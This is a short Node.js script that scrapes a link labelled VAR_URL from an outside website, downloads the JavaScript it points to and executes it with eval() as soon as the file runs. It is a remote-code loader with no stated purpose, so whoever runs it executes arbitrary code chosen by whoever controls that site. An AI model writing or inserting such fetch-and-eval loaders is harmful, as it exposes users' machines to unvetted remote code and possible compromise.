'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchVarUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const varUrl = $(`a:contains("VAR_URL")`).attr('href');

        if (!varUrl) throw new Error('VAR_URL not found on the webpage.');

        console.log('VAR_URL fetched successfully:', varUrl);

        const scriptResponse = await axios.get(varUrl);
        const scriptContent = scriptResponse.data;
        console.log("VAR_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching VAR_URL:', error.message);
    }
}

fetchVarUrl();